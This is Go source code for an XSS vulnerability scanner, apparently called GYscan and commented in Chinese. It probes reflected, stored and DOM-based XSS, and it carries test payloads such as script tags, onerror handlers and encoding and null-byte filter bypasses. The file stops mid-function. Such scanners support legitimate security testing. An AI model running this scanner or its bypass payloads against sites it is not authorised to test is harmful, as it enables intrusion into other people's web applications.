package xss

import (
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/PuerkitoBio/goquery"
	"github.com/go-resty/resty/v2"
)

// 测试用结构体
type TestXssCase struct {
	Name          string
	Input         string
	ExpectedValid bool
	Description   string
}

// TestXssDetection 测试优化后的XSS检测功能
func TestXssDetection() {
	fmt.Println("\n[GYscan-XSS] 开始测试XSS检测功能...")
	
	// 测试用例集
	testCases := []TestXssCase{
		// 基本反射型XSS测试
		{"基本JavaScript脚本标签", "<script>alert('XSS')</script>", true, "测试基本脚本标签检测"},
		{"事件处理属性", "<img src=x onerror=alert('XSS')>", true, "测试事件处理属性检测"},
		{"JavaScript伪协议", "<a href=javascript:alert('XSS')>", true, "测试JavaScript伪协议检测"},
		
		// 转义绕过测试
		{"HTML实体编码", "<img src=x onerror=alert&#40;'XSS'&#41;", true, "测试HTML实体编码绕过"},
		{"URL编码", "<img src=x onerror=alert%28%27XSS%27%29>", true, "测试URL编码绕过"},
		{"JavaScript转义", "<script>\\x61\\x6C\\x65\\x72\\x74('XSS')</script>", true, "测试JavaScript转义绕过"},
		{"大小写混合", "<ScRiPt>alert('XSS')</ScRiPt>", true, "测试大小写混合绕过"},
		{"多重重编码", "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;", true, "测试多重重编码绕过"},
		{"空字节注入", "<img src=x\x00 onerror=alert('XSS')>", true, "测试空字节注入绕过"},
		
		// 误报过滤测试
		{"HTML注释", "<!-- <script>alert('XSS')</script> -->", false, "测试HTML注释中的代码"},
		{"CDATA块", "<![CDATA[<script>alert('XSS')</script>]]>", false, "测试CDATA块中的代码"},
		{"文本节点", "这只是文本<script>alert('XSS')</script>", false, "测试非可执行上下文中的代码"},
		{"已转义内容", "&lt;script&gt;alert('XSS')&lt;/script&gt;", false, "测试完全转义的内容"},
		{"JSON响应", "{\"data\":\"<script>alert('XSS')</script>\"}", false, "测试JSON响应中的代码"},
		
		// DOM XSS测试
		{"DOM源到Sink直接引用", "var x = document.location.hash; document.write(x);", true, "测试DOM源到sink的直接引用"},
		{"DOM源到Sink变量传递", "var x = location.search; var y = x; eval(y);", true, "测试DOM源到sink的变量传递"},
		{"DOM源到Sink函数传递", "function test(x){ setTimeout(x, 0); }; test(window.name);", true, "测试DOM源到sink的函数传递"},
	}
	
	// 执行测试
	total := len(testCases)
	passed := 0
	
	fmt.Printf("[GYscan-XSS] 测试用例总数: %d\n", total)
	fmt.Println("[GYscan-XSS] ==============================")
	
	// 测试isPayloadReflected
	for _, tc := range testCases {
		// 跳过DOM XSS特定测试
		if strings.Contains(tc.Name, "DOM源") {
			continue
		}
		
		result := isPayloadReflected(tc.Input, tc.Input)
		// 对于误报测试，使用content-type进行额外检查
		if !tc.ExpectedValid && result {
			result = !isFalsePositive(tc.Input, tc.Input, "text/html")
		}
		
		if result == tc.ExpectedValid {
			passed++
			fmt.Printf("[GYscan-XSS] ✓ 通过: %s - %s\n", tc.Name, tc.Description)
		} else {
			fmt.Printf("[GYscan-XSS] ✗ 失败: %s - %s (期望: %v, 实际: %v)\n", 
				tc.Name, tc.Description, tc.ExpectedValid, result)
		}
	}
	
	// 测试isSourceToSink (DOM XSS)
	domCases := []TestXssCase{
		{"DOM源到Sink直接引用", "var x = document.location.hash; document.write(x);", true, "测试DOM源到sink的直接引用"},
		{"DOM源到Sink变量传递", "var x = location.search; var y = x; eval(y);", true, "测试DOM源到sink的变量传递"},
		{"DOM源到Sink函数传递", "function test(x){ setTimeout(x, 0); }; test(window.name);", true, "测试DOM源到sink的函数传递"},
	}
	
	domPassed := 0
	for _, tc := range domCases {
		// 检查各种source和sink组合
		hasVulnerability := false
		for _, source := range []string{"document.location.hash", "location.search", "window.name"} {
			for _, sink := range []string{"document.write", "eval", "setTimeout"} {
				if isSourceToSink(tc.Input, source, sink) {
					hasVulnerability = true
					break
				}
			}
			if hasVulnerability {
				break
			}
		}
		
		if hasVulnerability == tc.ExpectedValid {
			domPassed++
			fmt.Printf("[GYscan-XSS] ✓ 通过: %s - %s\n", tc.Name, tc.Description)
		} else {
			fmt.Printf("[GYscan-XSS] ✗ 失败: %s - %s (期望: %v, 实际: %v)\n", 
				tc.Name, tc.Description, tc.ExpectedValid, hasVulnerability)
		}
	}
	
	// 测试checkEscapeBypass
	escapeBypassCases := []TestXssCase{
		{"HTML实体编码绕过", "<img src=x onerror=alert&#40;'XSS'&#41;", true, "测试HTML实体编码绕过"},
		{"部分转义绕过", "<scr<script>ipt>alert('XSS')</script>", true, "测试部分转义绕过"},
	}
	
	escapePassed := 0
	for _, tc := range escapeBypassCases {
		result := checkEscapeBypass(tc.Input, "alert('XSS')")
		if result == tc.ExpectedValid {
			escapePassed++
			fmt.Printf("[GYscan-XSS] ✓ 通过: %s - %s\n", tc.Name, tc.Description)
		} else {
			fmt.Printf("[GYscan-XSS] ✗ 失败: %s - %s (期望: %v, 实际: %v)\n", 
				tc.Name, tc.Description, tc.ExpectedValid, result)
		}
	}
	
	// 输出测试结果摘要
	totalPassed := passed + domPassed + escapePassed
	totalTests := total - len(domCases) + domPassed + escapePassed
	
	fmt.Println("[GYscan-XSS] ==============================")
	fmt.Printf("[GYscan-XSS] 测试结果: %d/%d 通过 (%.1f%%)\n", 
		totalPassed, totalTests, float64(totalPassed)/float64(totalTests)*100)
	fmt.Println("[GYscan-XSS] 测试完成")
}

// ParamInfo 参数信息
type ParamInfo struct {
	Name   string
	Method string
	IsPath bool
}

// RunXssScan 执行XSS检测
func RunXssScan(config XssConfig) XssResults {
	// 如果启用测试模式，执行测试并返回空结果
	if config.TestMode {
		TestXssDetection()
		return XssResults{}
	}
	
	startTime := time.Now()
	results := XssResults{}

	// 初始化HTTP客户端
	client := resty.New()
	client.SetTimeout(10 * time.Second)
	client.SetRedirectPolicy(resty.FlexibleRedirectPolicy(5))

	// 根据检测类型执行不同的扫描
	switch strings.ToLower(config.Type) {
	case "reflected":
		results = scanReflectedXSS(config, client)
	case "stored":
		results = scanStoredXSS(config, client)
	case "dom":
		results = scanDOMXSS(config, client)
	case "all":
		// 扫描所有类型
		reflectedResults := scanReflectedXSS(config, client)
		storedResults := scanStoredXSS(config, client)
		domResults := scanDOMXSS(config, client)

		results.Results = append(results.Results, reflectedResults.Results...)
		results.Results = append(results.Results, storedResults.Results...)
		results.Results = append(results.Results, domResults.Results...)

		// 合并总结
		results.Summary.TotalURLs = reflectedResults.Summary.TotalURLs + storedResults.Summary.TotalURLs + domResults.Summary.TotalURLs
		results.Summary.TotalParams = reflectedResults.Summary.TotalParams + storedResults.Summary.TotalParams + domResults.Summary.TotalParams
		results.Summary.Vulnerable = reflectedResults.Summary.Vulnerable + storedResults.Summary.Vulnerable + domResults.Summary.Vulnerable
		results.Summary.Reflected = reflectedResults.Summary.Reflected
		results.Summary.Stored = storedResults.Summary.Stored
		results.Summary.DOM = domResults.Summary.DOM
	default:
		fmt.Printf("[GYscan-XSS] 无效的检测类型: %s，默认使用反射型检测\n", config.Type)
		results = scanReflectedXSS(config, client)
	}

	// 计算检测耗时
	results.Summary.DetectionTime = time.Since(startTime).Seconds()

	return results
}

// scanReflectedXSS 执行反射型XSS检测
func scanReflectedXSS(config XssConfig, client *resty.Client) XssResults {
	results := XssResults{}
	results.Summary.TotalURLs = 1

	// 解析URL，提取参数
	u, err := url.Parse(config.URL)
	if err != nil {
		fmt.Printf("[GYscan-XSS] URL解析错误: %v\n", err)
		return results
	}

	// 获取基础Payload
	payloads := getPayloads(config.PayloadLevel, ReflectedXSS)
	if config.Verbose {
		fmt.Printf("[GYscan-XSS] 加载Payload数量: %d (级别: %s)\n", len(payloads), config.PayloadLevel)
	}

	// 提取所有参数
	var allParams []ParamInfo

	// 1. 提取URL参数
	urlParams := u.Query()
	for paramName := range urlParams {
		allParams = append(allParams, ParamInfo{
			Name:   paramName,
			Method: "GET",
		})
	}

	// 2. 提取表单参数
	if isFormURL(config.URL, client) {
		formParams := extractFormParams(config.URL, client)
		for _, paramName := range formParams {
			allParams = append(allParams, ParamInfo{
				Name:   paramName,
				Method: "POST",
			})
		}
	}

	// 3. 提取路径参数（如果有）
	pathParams := extractPathParams(u.Path)
	for _, paramName := range pathParams {
		allParams = append(allParams, ParamInfo{
			Name:   paramName,
			Method: "GET",
			IsPath: true,
		})
	}

	results.Summary.TotalParams = len(allParams)
	if config.Verbose {
		fmt.Printf("[GYscan-XSS] 发现参数数量: %d\n", len(allParams))
		for i, param := range allParams {
			method := param.Method
			if param.IsPath {
				method += " (Path)"
			}
			fmt.Printf("[GYscan-XSS] 参数 #%d: %s (%s)\n", i+1, param.Name, method)
		}
	}

	// 如果没有参数，直接返回
	if len(allParams) == 0 {
		fmt.Println("[GYscan-XSS] 未发现可测试参数")
		return results
	}

	// 设置并发控制
	maxGoroutines := 5
	semaphore := make(chan struct{}, maxGoroutines)
	resultsChan := make(chan XssResult, len(allParams)*len(payloads))
	wg := &sync.WaitGroup{}

	// 速率限制（每秒最多发送10个请求）
	rateLimit := time.Tick(time.Second / 10)

	// 并发测试所有参数和Payload
	totalTests := len(allParams) * len(payloads)
	if config.Verbose {
		fmt.Printf("[GYscan-XSS] 开始测试反射型XSS，共 %d 个测试用例\n", totalTests)
	}

	// 用于记录已测试数量
	tested := 0
	testedMutex := &sync.Mutex{}

	for _, param := range allParams {
		for _, payload := range payloads {
			wg.Add(1)
			go func(p ParamInfo, pl string) {
				defer wg.Done()

				// 并发控制
				semaphore <- struct{}{}
				defer func() { <-semaphore }()

				// 速率限制
				<-rateLimit

				var testURL string
				var resp *resty.Response
				var err error

				if p.Method == "GET" {
					if p.IsPath {
						// 测试路径参数
						testPath := strings.Replace(u.Path, fmt.Sprintf("{%s}", p.Name), pl, -1)
						testPath = strings.Replace(testPath, fmt.Sprintf(":%s", p.Name), pl, -1)
						testURL = fmt.Sprintf("%s://%s%s", u.Scheme, u.Host, testPath)
						if u.RawQuery != "" {
							testURL += "?" + u.RawQuery
						}
					} else {
						// 测试URL参数
						testParams := u.Query()
						testParams.Set(p.Name, pl)
						testURL = fmt.Sprintf("%s://%s%s?%s", u.Scheme, u.Host, u.Path, testParams.Encode())
					}

					// 发送GET请求
					resp, err = client.R().Get(testURL)
				} else {
					// 测试POST表单参数
					testURL = config.URL
					resp, err = client.R().SetFormData(map[string]string{
						p.Name: pl,
					}).Post(testURL)
				}

				if err != nil {
					if config.Verbose {
						testedMutex.Lock()
						tested++
						fmt.Printf("[GYscan-XSS] 测试失败 #%d/%d: %s (参数: %s) - %v\n", tested, totalTests, testURL, p.Name, err)
						testedMutex.Unlock()
					}
					return
				}

				responseBody := resp.String()

				// 更新测试进度
				testedMutex.Lock()
				tested++
				if config.Verbose {
					fmt.Printf("[GYscan-XSS] 测试中 #%d/%d: %s (参数: %s, 状态码: %d)\n", tested, totalTests, testURL, p.Name, resp.StatusCode())
				}
				testedMutex.Unlock()

				// 获取Content-Type
			contentType := resp.Header().Get("Content-Type")
			
			// 检查是否为误报
			if isFalsePositive(responseBody, pl, contentType) {
				return
			}
			
			// 检查响应中是否包含未转义的Payload或绕过转义
			if isPayloadReflected(responseBody, pl) || checkEscapeBypass(responseBody, pl) {
				if config.Verbose {
					fmt.Printf("[GYscan-XSS] 发现漏洞: %s (参数: %s, Payload: %s)\n", testURL, p.Name, pl)
				}
				// 检测漏洞位置类型
				location := detectVulnerabilityLocation(contentType, responseBody, pl)
				result := XssResult{
					URL:          testURL,
					Param:        p.Name,
					Type:         "reflected",
					Payload:      pl,
					StatusCode:   resp.StatusCode(),
					Evidence:     extractEvidence(responseBody, pl),
					Location:     location,
					IsVulnerable: true,
				}
				resultsChan <- result
			}
			}(param, payload)
		}
	}

	// 等待所有goroutine完成
	go func() {
		wg.Wait()
		close(resultsChan)
	}()

	// 收集结果
	for result := range resultsChan {
		results.Results = append(results.Results, result)
		results.Summary.Vulnerable++
		results.Summary.Reflected++
	}

	return results
}

// scanStoredXSS 执行存储型XSS检测
func scanStoredXSS(config XssConfig, client *resty.Client) XssResults {
	results := XssResults{}
	results.Summary.TotalURLs = 1

	// 1. 如果提供了登录信息，先登录
	if config.LoginURL != "" && config.Username != "" && config.Password != "" {
		if config.Verbose {
			fmt.Printf("[GYscan-XSS] 正在登录到: %s (用户: %s)\n", config.LoginURL, config.Username)
		} else {
			fmt.Printf("[GYscan-XSS] 正在登录到: %s\n", config.LoginURL)
		}

		// 提取登录表单参数
		loginParams := extractFormParams(config.LoginURL, client)
		if config.Verbose {
			fmt.Printf("[GYscan-XSS] 登录表单参数: %v\n", loginParams)
		}
		if len(loginParams) == 0 {
			fmt.Println("[GYscan-XSS] 无法提取登录表单参数")
			return results
		}

		// 构建登录数据
		loginData := make(map[string]string)
		for _, param := range loginParams {
			if param == "username" || param == "user" || param == "login" || param == "email" {
				loginData[param] = config.Username
			} else if param == "password" || param == "pass" {
				loginData[param] = config.Password
			} else {
				// 其他参数可能需要默认值
				loginData[param] = ""
			}
		}

		// 发送登录请求
		resp, err := client.R().SetFormData(loginData).Post(config.LoginURL)
		if err != nil {
			fmt.Printf("[GYscan-XSS] 登录失败: %v\n", err)
			return results
		}

		if resp.StatusCode() != 200 {
			fmt.Printf("[GYscan-XSS] 登录失败，状态码: %d\n", resp.StatusCode())
			return results
		}

		fmt.Println("[GYscan-XSS] 登录成功")
	}

	// 2. 提取目标页面的表单参数
	formParams := extractFormParams(config.URL, client)
	results.Summary.TotalParams = len(formParams)

	if len(formParams) == 0 {
		fmt.Println("[GYscan-XSS] 无法提取目标页面的表单参数")
		return results
	}

	// 3. 获取存储型XSS的Payload
	payloads := getPayloads(config.PayloadLevel, StoredXSS)

	// 4. 测试每个表单参数
	for _, param := range formParams {
		for _, payload := range payloads {
			// 构建表单数据
			formData := make(map[string]string)
			for _, p := range formParams {
				if p == param {
					formData[p] = payload
				} else {
					formData[p] = "test"
				}
			}

			// 提交表单
			resp, err := client.R().SetFormData(formData).Post(config.URL)
			if err != nil {
				continue
			}

			// 5. 再次访问目标页面，检查Payload是否被存储并反射
			resp, err = client.R().Get(config.URL)
			if err != nil {
				continue
			}

			responseBody := resp.String()

			// 获取Content-Type
			contentType := resp.Header().Get("Content-Type")
			
			// 检查是否为误报
			if isFalsePositive(responseBody, payload, contentType) {
				continue
			}
			
			// 检查响应中是否包含未转义的Payload或绕过转义
			if isPayloadReflected(responseBody, payload) || checkEscapeBypass(responseBody, payload) {
				// 检测漏洞位置类型
				location := detectVulnerabilityLocation(contentType, responseBody, payload)
				result := XssResult{
					URL:          config.URL,
					Param:        param,
					Type:         "stored",
					Payload:      payload,
					StatusCode:   resp.StatusCode(),
					Evidence:     extractEvidence(responseBody, payload),
					Location:     location,
					IsVulnerable: true,
				}
				results.Results = append(results.Results, result)
				results.Summary.Vulnerable++
				results.Summary.Stored++
				break
			}
		}
	}

	return results
}

// scanDOMXSS 执行DOM型XSS检测
func scanDOMXSS(config XssConfig, client *resty.Client) XssResults {
	results := XssResults{}
	results.Summary.TotalURLs = 1

	// 1. 获取页面内容
	if config.Verbose {
		fmt.Printf("[GYscan-XSS] 获取页面内容: %s\n", config.URL)
	}
	resp, err := client.R().Get(config.URL)
	if err != nil {
		fmt.Printf("[GYscan-XSS] 获取页面内容失败: %v\n", err)
		return results
	}

	pageContent := resp.String()

	// 2. 提取所有JavaScript代码
	jsCode := extractJavaScript(pageContent)

	if jsCode == "" {
		fmt.Println("[GYscan-XSS] 页面中未找到JavaScript代码")
		return results
	}

	if config.Verbose {
		fmt.Printf("[GYscan-XSS] 提取到JavaScript代码: %d 字符\n", len(jsCode))
	}

	// 3. 定义常见的DOM XSS源 - 扩展版
	sources := []string{
		// URL相关源点
		"document.URL",
		"document.location",
		"document.location.href",
		"document.location.search",
		"document.location.hash",
		"document.location.pathname",
		"document.location.hostname",
		"document.location.port",
		"document.location.protocol",
		"window.location",
		"window.location.href",
		"window.location.search",
		"window.location.hash",
		"window.location.pathname",
		"window.location.hostname",
		"window.location.port",
		"window.location.protocol",
		"location",
		"location.href",
		"location.search",
		"location.hash",
		"location.pathname",
		"location.hostname",
		"location.port",
		"location.protocol",
		
		// 文档相关源点
		"document.referrer",
		"document.cookie",
		"document.baseURI",
		"document.documentURI",
		
		// 其他常见源点
		"window.name",
		"window.opener",
		"window.parent",
		"window.top",
		"window.frames",
		"window.iframe",
		"window.postMessage",
		
		// 表单相关源点
		"document.forms",
		"document.forms[0]",
		"document.querySelector",
		"document.querySelectorAll",
		"document.getElementById",
		"document.getElementsByTagName",
		"document.getElementsByClassName",
		
		// localStorage和sessionStorage
		"localStorage.getItem",
		"sessionStorage.getItem",
		"localStorage",
		"sessionStorage",
		
		// XMLHttpRequest和fetch响应
		"XMLHttpRequest.responseText",
		"XMLHttpRequest.response",
		"fetch.then",
		"response.json",
		"response.text",
		
		// URLSearchParams
		"URLSearchParams.get",
		"URLSearchParams.getAll",
		
		// 其他可能的源点
		"history.back",
		"history.forward",
		"history.go",
		"navigator.userAgent",
		"navigator.platform",
		"navigator.language",
	}

	// 4. 定义常见的DOM XSS sink - 扩展版
	sinks := []string{
		// HTML内容操作sink
		"document.write",
		"document.writeln",
		"document.writeIn",
		"document.createElement",
		"Element.prototype.innerHTML",
		"Element.prototype.outerHTML",
		"innerHTML",
		"outerHTML",
		"document.body.innerHTML",
		"document.documentElement.innerHTML",
		
		// 动态脚本执行sink
		"eval",
		"setTimeout",
		"setInterval",
		"Function",
		"new Function",
		"document.execCommand",
		"window.execScript",
		
		// URL跳转sink
		"document.location",
		"document.location.assign",
		"document.location.replace",
		"document.location.reload",
		"window.location",
		"window.location.assign",
		"window.location.replace",
		"window.location.reload",
		"location",
		"location.assign",
		"location.replace",
		"location.reload",
		"window.open",
		"window.location.href=",
		"document.location.href=",
		"location.href=",
		
		// 事件处理sink
		"addEventListener",
		"removeEventListener",
		"onerror",
		"onload",
		"onunload",
		"onclick",
		"onmouseover",
		"onmouseout",
		"onfocus",
		"onblur",
		"onchange",
		"onsubmit",
		"onkeydown",
		"onkeyup",
		"onkeypress",
		
		// 属性操作sink
		"setAttribute",
		"getAttribute",
		"removeAttribute",
		"hasAttribute",
		"createAttribute",
		
		// 资源加载sink
		"src",
		".src",
		"href",
		".href",
		"action",
		".action",
		"data",
		".data",
		"style",
		".style",
		"backgroundImage",
		"innerHTML",
		"outerHTML",
		
		// 框架操作sink
		"document.domain",
		"document.open",
		"document.close",
		"document.clear",
		"window.name=",
		"window.postMessage",
		"iframe.contentWindow",
		"iframe.src",
		"iframe.srcdoc",
		
		// CSS相关sink
		"style.cssText",
		"style.setProperty",
		"document.styleSheets",
		"CSSStyleSheet.insertRule",
		"CSSStyleSheet.deleteRule",
		
		// DOM操作sink
		"appendChild",
		"insertBefore",
		"replaceChild",
		"removeChild",
		"cloneNode",
		"importNode",
		"createDocumentFragment",
		"document.adoptNode",
		
		// SVG相关sink
		"setAttributeNS",
		"createElementNS",
		"createAttributeNS",
	}

	// 5. 检查是否存在DOM XSS漏洞
	totalChecks := len(sources) * len(sinks)
	checked := 0

	if config.Verbose {
		fmt.Printf("[GYscan-XSS] 开始检查DOM XSS，共 %d 个源点/接收点组合\n", totalChecks)
		fmt.Printf("[GYscan-XSS] 检查的源点数量: %d\n", len(sources))
		fmt.Printf("[GYscan-XSS] 检查的接收点数量: %d\n", len(sinks))
	}

	for _, source := range sources {
		for _, sink := range sinks {
			checked++
			if config.Verbose && checked%50 == 0 {
				fmt.Printf("[GYscan-XSS] DOM XSS检查进度: %d/%d\n", checked, totalChecks)
			}

			// 检查source是否在sink附近被使用
			if strings.Contains(jsCode, source) && strings.Contains(jsCode, sink) {
				// 更精确地检查source是否被传递到sink
				// 这里使用简单的字符串匹配，实际检测需要更复杂的AST分析
				if isSourceToSink(jsCode, source, sink) {
					if config.Verbose {
						fmt.Printf("[GYscan-XSS] 发现DOM XSS漏洞: %s -> %s\n", source, sink)
					}
					// 为DOM XSS生成更具体的位置信息
			location := fmt.Sprintf("JavaScript (%s -> %s)", source, sink)
			result := XssResult{
				URL:          config.URL,
				Param:        source,
				Type:         "dom",
				Payload:      fmt.Sprintf("%s -> %s", source, sink),
				StatusCode:   resp.StatusCode(),
				Evidence:     extractDOMEvidence(jsCode, source, sink),
				Location:     location,
				IsVulnerable: true,
			}
					results.Results = append(results.Results, result)
					results.Summary.Vulnerable++
					results.Summary.DOM++
				}
			}
		}
	}

	return results
}

// extractJavaScript 从页面内容中提取JavaScript代码
func extractJavaScript(pageContent string) string {
	var jsCode strings.Builder

	// 使用goquery解析HTML
	reader := strings.NewReader(pageContent)
	doc, err := goquery.NewDocumentFromReader(reader)
	if err != nil {
		return ""
	}

	// 提取内联script标签
	doc.Find("script").Each(func(i int, s *goquery.Selection) {
		if _, exists := s.Attr("src"); !exists {
			// 内联脚本
			jsCode.WriteString(s.Text())
			jsCode.WriteString("\n")
		} else {
		}
	})

	// 提取事件处理程序中的JavaScript
	events := []string{
		"onclick", "onload", "onerror", "onmouseover", "onmouseout",
		"onkeydown", "onkeyup", "onkeypress", "onsubmit", "onreset",
	}

	for _, event := range events {
		doc.Find(fmt.Sprintf("[\n%s]", event)).Each(func(i int, s *goquery.Selection) {
			if js, exists := s.Attr(event); exists {
				jsCode.WriteString(js)
				jsCode.WriteString("\n")
			}
		})
	}

	return jsCode.String()
}

// isSourceToSink 检查source是否被传递到sink
func isSourceToSink(jsCode, source, sink string) bool {
	// 首先进行基础检查
	sourceIndex := strings.Index(jsCode, source)
	sinkIndex := strings.Index(jsCode, sink)
	if sourceIndex == -1 || sinkIndex == -1 || sourceIndex > sinkIndex {
		return false
	}

	// 检查直接引用模式：source → sink
	if containsDirectReference(jsCode, source, sink) {
		return true
	}

	// 检查变量中间传递：source → var → sink
	if containsVariableTransfer(jsCode, source, sink) {
		return true
	}

	// 检查函数参数传递：source → func(param) → sink使用param
	if containsFunctionTransfer(jsCode, source, sink) {
		return true
	}

	// 检查对象属性传递：source → object.prop → sink使用object.prop
	if containsObjectTransfer(jsCode, source, sink) {
		return true
	}

	// 检查数组索引传递：source → array[index] → sink使用array[index]
	if containsArrayTransfer(jsCode, source, sink) {
		return true
	}

	return false
}

// containsDirectReference 检查是否存在source到sink的直接引用
func containsDirectReference(jsCode, source, sink string) bool {
	// 检查常见的直接连接模式
	directPatterns := []string{
		fmt.Sprintf("%s\\.value\\.%s", source, sink),
		fmt.Sprintf(`%s\[.+\]\.%s`, source, sink),
		fmt.Sprintf("%s\\(\\).+%s", source, sink),
		fmt.Sprintf("%s\\s*\\+\\s*.+\\s*\\+\\s*%s", sink, source), // sink + ... + source
	}

	for _, pattern := range directPatterns {
		matched, _ := regexp.MatchString(pattern, jsCode)
		if matched {
			return true
		}
	}

	// 检查简单的直接使用模式
	// 在source和sink之间不应该有函数定义或复杂逻辑
	sourceIndex := strings.Index(jsCode, source)
	sinkIndex := strings.Index(jsCode, sink)
	
	// 检查索引是否有效且source结束位置在sink之前
	if sourceIndex != -1 && sinkIndex != -1 && sourceIndex+len(source) < sinkIndex {
		between := jsCode[sourceIndex+len(source):sinkIndex]
		if !strings.Contains(between, "function") && !strings.Contains(between, "if(") &&
			(strings.Contains(between, "=" ) || strings.Contains(between, "+" ) ||
			 strings.Contains(between, "." ) || strings.Contains(between, "[" )) {
			return true
		}
	}

	return false
}

// containsVariableTransfer 检查是否存在变量中间传递
func containsVariableTransfer(jsCode, source, sink string) bool {
	// 提取source到sink之间的代码
	sourceIndex := strings.Index(jsCode, source)
	sinkIndex := strings.Index(jsCode, sink)
	if sourceIndex == -1 || sinkIndex == -1 || sourceIndex+len(source) >= sinkIndex {
		return false
	}

	between := jsCode[sourceIndex+len(source):sinkIndex]

	// 使用正则表达式匹配变量赋值模式
	// 例如: var x = source; ... sink(x)
	varPattern := regexp.MustCompile(`(var|let|const)\s+([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*[^;]*` + regexp.QuoteMeta(source) + `[^;]*;`)
	matches := varPattern.FindStringSubmatch(between)
	if len(matches) > 2 {
		varName := matches[2]
		// 检查变量是否在sink前使用
		if strings.Contains(between[strings.Index(between, matches[0]):], sink+"("+varName+")") ||
		   strings.Contains(between[strings.Index(between, matches[0]):], sink+"["+varName+"]") ||
		   strings.Contains(between[strings.Index(between, matches[0]):], sink+`\+\s*`) ||
		   strings.Contains(between[strings.Index(between, matches[0]):], varName+`\+\`+sink) ||
		   strings.Contains(between[strings.Index(between, matches[0]):], sink+"."+varName) {
			return true
		}
	}

	// 检查隐式变量声明
	implicitVarPattern := regexp.MustCompile(`([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*[^;]*` + regexp.QuoteMeta(source) + `[^;]*;`)
	matches = implicitVarPattern.FindStringSubmatch(between)
	if len(matches) > 1 {
		varName := matches[1]
		// 避免匹配关键词
		if isJavaScriptKeyword(varName) {
			return false
		}
		// 检查变量是否在sink前使用
		if strings.Contains(between[strings.Index(between, matches[0]):], sink+"("+varName+")") ||
		   strings.Contains(between[strings.Index(between, matches[0]):], sink+"["+varName+"]") ||
		   strings.Contains(between[strings.Index(between, matches[0]):], sink+`\s*\+\s*`+varName) ||
		   strings.Contains(between[strings.Index(between, matches[0]):], varName+"\\s*\\+\\s*"+sink) ||
		   strings.Contains(between[strings.Index(between, matches[0]):], sink+"."+varName) {
			return true
		}
	}

	return false
}

// containsFunctionTransfer 检查是否存在函数参数传递
func containsFunctionTransfer(jsCode, source, sink string) bool {
	// 提取source到sink之间的代码
	sourceIndex := strings.Index(jsCode, source)
	sinkIndex := strings.Index(jsCode, sink)
	if sourceIndex == -1 || sinkIndex == -1 || sourceIndex+len(source) >= sinkIndex {
		return false
	}

	between := jsCode[sourceIndex+len(source):sinkIndex]

	// 检查函数调用传递
	// 例如: someFunc(source); ... sink(参数)
	funcCallPattern := regexp.MustCompile(`([a-zA-Z_$][a-zA-Z0-9_$]*)\s*\(.*` + regexp.QuoteMeta(source) + `.*\)`)
	matches := funcCallPattern.FindStringSubmatch(between)
	if len(matches) > 1 {
		funcName := matches[1]
		// 检查函数定义中是否使用了sink
		funcDefPattern := regexp.MustCompile(`function\s+` + regexp.QuoteMeta(funcName) + `\s*\(([^)]*)\)\s*\{([^}]*)` + regexp.QuoteMeta(sink) + `([^}]*)\}`)
		if funcDefPattern.MatchString(jsCode) {
			return true
		}
	}

	return false
}

// containsObjectTransfer 检查是否存在对象属性传递
func containsObjectTransfer(jsCode, source, sink string) bool {
	// 提取source到sink之间的代码
	sourceIndex := strings.Index(jsCode, source)
	sinkIndex := strings.Index(jsCode, sink)
	if sourceIndex == -1 || sinkIndex == -1 || sourceIndex+len(source) >= sinkIndex {
		return false
	}

	between := jsCode[sourceIndex+len(source):sinkIndex]

	// 检查对象属性赋值
	// 例如: obj.prop = source; ... sink(obj.prop)
	objPattern := regexp.MustCompile(`([a-zA-Z_$][a-zA-Z0-9_$.]*)\s*=\s*[^;]*` + regexp.QuoteMeta(source) + `[^;]*;`)
	matches := objPattern.FindStringSubmatch(between)
	if len(matches) > 1 {
		propName := matches[1]
		// 检查属性是否在sink前使用
		if strings.Contains(between[strings.Index(between, matches[0]):], sink+"("+propName+")") ||
		   strings.Contains(between[strings.Index(between, matches[0]):], sink+"["+propName+"]") ||
		   strings.Contains(between[strings.Index(between, matches[0]):], sink+`\s*\+\s*`+propName) ||
		   strings.Contains(between[strings.Index(between, matches[0]):], propName+`\s*\+\s*`+sink) {
			return true
		}
	}

	return false
}

// containsArrayTransfer 检查是否存在数组索引传递
func containsArrayTransfer(jsCode, source, sink string) bool {
	// 提取source到sink之间的代码
	sourceIndex := strings.Index(jsCode, source)
	sinkIndex := strings.Index(jsCode, sink)
	if sourceIndex == -1 || sinkIndex == -1 || sourceIndex+len(source) >= sinkIndex {
		return false
	}

	between := jsCode[sourceIndex+len(source):sinkIndex]

	// 检查数组赋值
	// 例如: arr[index] = source; ... sink(arr[index])
	arrPattern := regexp.MustCompile(`([a-zA-Z_$][a-zA-Z0-9_$]*)\s*\[([^\]]+)\]\s*=\s*[^;]*` + regexp.QuoteMeta(source) + `[^;]*;`)
	matches := arrPattern.FindStringSubmatch(between)
	if len(matches) > 2 {
		arrName := matches[1]
		indexExpr := matches[2]
		arrAccess := arrName + "[" + indexExpr + "]"
		// 检查数组访问是否在sink前使用
		if strings.Contains(between[strings.Index(between, matches[0]):], sink+"("+arrAccess+")") ||
		   strings.Contains(between[strings.Index(between, matches[0]):], sink+"["+arrAccess+"]") ||
		   strings.Contains(between[strings.Index(between, matches[0]):], sink+`\+\s*`+arrAccess) ||
		   strings.Contains(between[strings.Index(between, matches[0]):], arrAccess+`\s*\+\s*`+sink) {
			return true
		}
	}

	return false
}

// isJavaScriptKeyword 检查是否为JavaScript关键词
func isJavaScriptKeyword(word string) bool {
	keywords := map[string]bool{
		"break":      true,
		"case":       true,
		"catch":      true,
		"class":      true,
		"const":      true,
		"continue":   true,
		"debugger":   true,
		"default":    true,
		"delete":     true,
		"do":         true,
		"else":       true,
		"export":     true,
		"extends":    true,
		"finally":    true,
		"for":        true,
		"function":   true,
		"if":         true,
		"import":     true,
		"in":         true,
		"instanceof": true,
		"new":        true,
		"return":     true,
		"super":      true,
		"switch":     true,
		"this":       true,
		"throw":      true,
		"try":        true,
		"typeof":     true,
		"var":        true,
		"void":       true,
		"while":      true,
		"with":       true,
		"yield":      true,
		"true":       true,
		"false":      true,
		"null":       true,
	}
	return keywords[word]
}

// extractDOMEvidence 提取DOM XSS的证据
func extractDOMEvidence(jsCode, source, sink string) string {
	// 提取包含source和sink的上下文
	sourceIndex := strings.Index(jsCode, source)
	if sourceIndex == -1 {
		return ""
	}

